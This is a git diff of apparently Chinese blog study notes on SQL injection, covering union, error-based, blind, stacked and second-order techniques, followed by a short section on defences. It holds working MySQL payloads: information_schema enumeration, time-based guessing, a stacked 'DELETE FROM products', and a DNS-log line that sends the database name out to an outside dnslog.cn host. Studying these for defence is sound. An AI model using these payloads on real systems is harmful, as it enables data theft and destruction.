@@ -117,130 +117,161 @@
 <p></p>
 #### sql注入的类型
 
-<ol>
-<li><p>联合注入</p>
-<p> <strong>前提条件</strong>：提交完数据之后，可以在前台看见一个提交后的的显示，这个</p>
-<p> 展示的数据就叫做展示位。</p>
-<p> eg：select *from user where id =1</p>
-<p> 可以使用order by 语句判断出表有几列</p>
-<p> select *from user where id =1 order by 从1开始增加的数字</p>
-<p> eg：</p>
-<p> +———–+————–+—————+—————–+</p>
-<p> | runoob_id | runoob_title | runoob_author | submission_date |</p>
-<p> +———–+————–+—————+—————–+|</p>
-<p> |      1       | 学习 PHP | 菜鸟教程| 2022-12-07|</p>
-<p> +———–+————–+—————+—————–+</p>
-<p> 可以看出现在这个表有四列，也就是当 select *from user where id=1 order by 5 时 程序会报错：ERROR 1054 (42S22): Unknowncolumn ‘5’ in ‘order clause’判断出列数以后，可以获取展示位的位置</p>
-<p> select * from user where id =-1 union select 1;</p>
-<p> select 后面加数字，就会直接显示出来，这样在前台显示的数字，就是一个展示位,得到展示位之后，可以首先判断数据库的类型、版本等信息<br> select * from user where id =-1 union select 1;database();<br> 因为有时候页面可能只会显示一位信息，所以这里需要给一个根本查不出数据的值，以便将后面的信息显示出来.<br> 查询表名</p>
-<p> 在mysql5.0以上的版本中加入了information_schema这个系统自带库，可以看到里面用数据库可以查询到表名，用表名可以查询到字段，我们可以加以利用。</p>
-<p> select * from user where ID = -1 union select 1,table_name,3,4  from information_schema.tables where table_schema=’库名’limit 0,1–+ 和–(空格是为了注释后面的语句)</p>
-<p> 查询字段</p>
-<p> information_schema.columns存放着字段名和表名的对应</p>
-<p> 构造语句：union select 1,column_name,3,4 from information_schema.columns where table_name=’表名’<br> 有字段有表名，就可以直接构造 select 字段 from 表名</p>
-</li>
-<li><p>报错注入</p>
-<p> 在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，</p>
-<p> 利用报错函数获取数据库数据</p>
-<p> <strong>报错语句</strong></p>
-<p> updatexml()报错:updatexml():updatexml(XML_document, XPath_string,</p>
-<p> new_value);</p>
- <p>简单的来说就是 update(目标xml类容，xml文档路径，更新的内容)我们在xml文档路径的位置写入了子查询，和特殊字符拼接在一起，因为不符合输入路径规则然后报错，先执行了子查询我们可以得到库名。0x7e是16进制里面的“~”，是一个特殊符号，不符合路径规则报错</p>
+<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><br>
+    前提条件：提交完数据之后，可以在前台看见一个提交后的的显示，这个
 
-<p> eg:</p>
-<p> select * from aaa where id=1 and updatexml(1,concat(0x7e,(select user()),1)</p>
-<p> <em>0x7e是一个~符号</em></p>
-<ol>
-<li><p>extractvalue()报错</p>
-<p> extractvalue()作用:对XML文档进行查询，相当于在HTML文件中用标签查找元</p>
-</li>
-</ol>
-<p> 素。</p>
-<pre><code> 语法: extractvalue(XML\_document, XPath\_string )
-
- 参数1: XML\_document是String格式，为XML文档对象的名称
-
- 参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
-
- 参数1: XML\_document是String格式，为XML文档对象的名称
-
- 参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
-
- eg:select extractvalue(1,concat(’ ~ &#39;,user()));
-
- 之后的可以和联合注入一样
+<pre><code>展示的数据就叫做展示位。&lt;/br&gt;
 </code></pre>
-<ol start="2">
-<li><p>floor报错(主键冲突（重复）)</p>
-<p> 主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()</p>
-<p> 利用 select count(*),(floor(rand(0)*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错</p>
-<p> 理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，</p>
-<p> 产生大于等于0小于1的伪随机序列<br> 理解floor(rand(0)*2)</p>
-<p> floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p>
-<p> floor(rand(0)*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。<br> 理解group by:group by进行分组排序相同名字合并<br> 理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。</p>
-</li>
-<li><p>盲注</p>
-<p> 布尔注入</p>
-<p> sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。</p>
-<p> 注入流程</p>
-<pre><code> 第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断
+<br>
 
- 第二步，同样的，使用order by 判断列数
+<pre><code>eg：select \*from user where id =1
 
- 第三步：就要构造语句来进行猜解数据长度和库名：
+可以使用order by 语句判断出表有几列
 
- eg： and length(database())=8--+
-
- ?id=1&#39; and (ascii(substr(database(),1,1)) &gt;100) --+
+select \*from user where id =1 order by 从1开始增加的数字
 </code></pre>
-<p> 时间盲注</p>
-<p> sql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。</p>
-<p> 注入过程</p>
-<pre><code> id=1&#39; and if(length(database())&gt;1,sleep(2),0) --+
+<br>
+    eg：
 
- 增加1值来猜库名的长度
+<pre><code>+-----------+--------------+---------------+-----------------+
 
- id=1&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) --+
+| runoob\_id | runoob\_title | runoob\_author | submission\_date |
 
- 增加1值，对照ascii表查询库名
++-----------+--------------+---------------+-----------------+|
 
- id=1’ and if(ascii(substr((select table\_name from
+|      1       | 学习 PHP | 菜鸟教程| 2022-12-07|
 
- information\_schema.tables where table\_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,sleep(1),0)--+
++-----------+--------------+---------------+-----------------+
 
- 增加1值，对照ascii表查询表名
+可以看出现在这个表有四列，也就是当 select \*from user where id=1 order by 5 时 程序会报错：ERROR 1054 (42S22): Unknowncolumn &#39;5&#39; in &#39;order clause&#39;判断出列数以后，可以获取展示位的位置
 
- id=1&#39; and if(ascii(substr((select column\_name from
+select \* from user where id =-1 union select 1;
+select 后面加数字，就会直接显示出来，这样在前台显示的数字，就是一个展示位,得到展示位之后，可以首先判断数据库的类型、版本等信息
 
- information\_schema.columns where table\_schema=database()
+select \* from user where id =-1 union select 1;database();
+因为有时候页面可能只会显示一位信息，所以这里需要给一个根本查不出数据的值，以便将后面的信息显示出来.
+查询表名
+在mysql5.0以上的版本中加入了information\_schema这个系统自带库，可以看到里面用数据库可以查询到表名，用表名可以查询到字段，我们可以加以利用。
 
- and table\_name=&#39;emails&#39; limit 0,1),1,1))&gt;104,sleep(1),0)--+
+select * from user where ID = -1 union select 1,table_name,3,4  from information_schema.tables where table_schema=’库名’limit 0,1--+ 和--(空格是为了注释后面的语句)
 
- 增加1值，对照ascii表查询列名
+查询字段
 
- id=1&#39; and if(ascii(substr((select id from emails limit
+information\_schema.columns存放着字段名和表名的对应
 
- 0,1),1,1))&gt;49,sleep(1),0)--+
-
- 根据表名和列名进行暴值
+构造语句：union select 1,column\_name,3,4 from information\_schema.columns where table\_name=’表名’
+有字段有表名，就可以直接构造 select 字段 from 表名
 </code></pre>
-</li>
-<li><p>堆叠注入</p>
-<p> 在SQL语句中，语句的结束都是以<code>;</code>结尾，但是如果我们在<code>;</code>后面再加<br> 上一条SQL语句，两条语句会一起执行吗？这也就是造成堆叠注入的原因了<br> 区别就在于union 或者union all执行的语句类型是有限的，可以用来执<br> 行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例<br> 子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：<br> （因未对输入的参数进行过滤）Select * from products where<br> productid=1;DELETE FROM products当执行查询后，第一条显示查询<br> 信息，第二条则将整个表进行删除。</p>
-</li>
-<li><p>二次注入</p>
-<p> 用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。</p>
-</li>
-<li><p>宽字节注入<br> “….”</p>
-</li>
-<li><p>cookie注入<br> “….”</p>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h3><p>采用预编译技术:预编译技术在创建的时候就已经将指定的SQL语句发送给数据库，而攻击者只是在修改用户提交的变量，而无法对数据库语句进行修改</p>
-<p>严格控制数据类型:在写代码的时候，需要对用户提交的数据类型进行严格限制，像是java c这种强类型语言，是不会存在数字型注入的，因为定义好类型之后，当输入string类型时就会报错，而像php、asp这种没有强调数据处理类型的语言就会容易出现问题</p>
-<p>对特殊字符转义:</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><pre><code>在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，
+
+利用报错函数获取数据库数据
+
+**报错语句**
+
+updatexml()报错:updatexml():updatexml(XML\_document, XPath\_string,
+
+new_value);
+
+&lt;p&gt;简单的来说就是 update(目标xml类容，xml文档路径，更新的内容)我们在xml文档路径的位置写入了子查询，和特殊字符拼接在一起，因为不符合输入路径规则然后报错，先执行了子查询我们可以得到库名。0x7e是16进制里面的“~”，是一个特殊符号，不符合路径规则报错&lt;/p&gt;
+
+eg:
+
+```select \* from aaa where id=1 and updatexml(1,concat(0x7e,(select user()),1)```
+
+*0x7e是一个~符号*
+</code></pre>
+<h6 id="1-extractvalue-报错"><a href="#1-extractvalue-报错" class="headerlink" title="1. extractvalue()报错"></a>1. extractvalue()报错</h6><pre><code> extractvalue()作用:对XML文档进行查询，相当于在HTML文件中用标签查找元
+
+素。
+
+    语法: extractvalue(XML\_document, XPath\_string )
+
+    参数1: XML\_document是String格式，为XML文档对象的名称
+
+    参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
+
+    参数1: XML\_document是String格式，为XML文档对象的名称
+
+    参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
+
+    eg:select extractvalue(1,concat(’ ~ &#39;,user()));
+
+    之后的可以和联合注入一样
+</code></pre>
+<h6 id="2-floor报错-主键冲突（重复）"><a href="#2-floor报错-主键冲突（重复）" class="headerlink" title="2. floor报错(主键冲突（重复）)"></a>2. floor报错(主键冲突（重复）)</h6><pre><code>    主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()
+
+    利用 select count(\*),(floor(rand(0)\*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错
+
+    理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，
+
+    产生大于等于0小于1的伪随机序列
+    理解floor(rand(0)\*2)
+
+    floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。
+
+    floor(rand(0)\*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。
+    理解group by:group by进行分组排序相同名字合并
+    理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。
+</code></pre>
+<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><h6 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1.  布尔注入"></a>1.  布尔注入</h6><pre><code>    sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。
+
+    注入流程
+
+        第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断
+
+        第二步，同样的，使用order by 判断列数
+
+        第三步：就要构造语句来进行猜解数据长度和库名：
+
+        eg： and length(database())=8--+
+
+        ?id=1&#39; and (ascii(substr(database(),1,1)) &gt;100) --+
+</code></pre>
+<h6 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.  时间盲注"></a>2.  时间盲注</h6><pre><code>    sql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。
+
+    注入过程
+
+        id=1&#39; and if(length(database())&gt;1,sleep(2),0) --+
+
+        增加1值来猜库名的长度
+
+        id=1&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) --+
+
+        增加1值，对照ascii表查询库名
+
+        id=1’ and if(ascii(substr((select table\_name from
+
+        information\_schema.tables where table\_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,sleep(1),0)--+
+
+        增加1值，对照ascii表查询表名
+
+        id=1&#39; and if(ascii(substr((select column\_name from
+
+        information\_schema.columns where table\_schema=database()
+
+        and table\_name=&#39;emails&#39; limit 0,1),1,1))&gt;104,sleep(1),0)--+
+
+        增加1值，对照ascii表查询列名
+
+        id=1&#39; and if(ascii(substr((select id from emails limit
+
+        0,1),1,1))&gt;49,sleep(1),0)--+
+
+        根据表名和列名进行暴值
+</code></pre>
+<h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>原理：在SQL语句中，语句的结束都是以<code>;</code>结尾，但是如果我们在<code>;</code>后面再加上一条SQL语句，两条语句会一起执行吗？这也就是造成堆叠注入的原因了区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。</p>
+<p>用户输入：1; DELETE FROM products服务器端生成的sql语句为：</p>
+<p>（因未对输入的参数进行过滤）<code>Select \* from products where productid=1;DELETE FROM products</code></p>
+<p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。<br>可以用sqlib-13 来作为演示</p>
+<p>id=1’ and load_file(concat(“\\“,(database()),”.zt5cka.dnslog.cn\1.txt”)) – -</p>
+<h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>原理：用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。</p>
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><pre><code>    &quot;....&quot;
+</code></pre>
+<h5 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h5><pre><code>    &quot;....&quot;
+</code></pre>
+<h4 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h4><h6 id="1-采用预编译技术"><a href="#1-采用预编译技术" class="headerlink" title="1.  采用预编译技术"></a>1.  采用预编译技术</h6><p>预编译技术在创建的时候就已经将指定的SQL语句发送给数据库，而攻击者只是在修改用户提交的变量，而无法对数据库语句进行修改</p>
+<h6 id="2-严格控制数据类型"><a href="#2-严格控制数据类型" class="headerlink" title="2.  严格控制数据类型"></a>2.  严格控制数据类型</h6><p>在写代码的时候，需要对用户提交的数据类型进行严格限制，像是java c这种强类型语言，是不会存在数字型注入的，因为定义好类型之后，当输入string类型时就会报错，而像php、asp这种没有强调数据处理类型的语言就会容易出现问题</p>
+<h6 id="对特殊字符转义"><a href="#对特殊字符转义" class="headerlink" title="对特殊字符转义"></a>对特殊字符转义</h6><p>数字型注入可以通过检查数据类型防止，但是字符型不可以，那么怎么办呢，最好的办法就是对特殊的字符进行转义了。比如在MySQL中我们可以对” ‘ “进行转义，这样就防止了一些恶意攻击者来闭合语句。当然我们也可以通过一些安全函数来转义特殊字符。如addslashes（）等，但是这些函数并非一劳永逸，攻击者还可以通过一些特殊的方式绕过。</p>
 <h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h2><pre><code>用户可以构造一个可以恶意获取信息的json页面，诱导用户点击，从而获取用的
 </code></pre>
 <h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><pre><code>敏感操作:
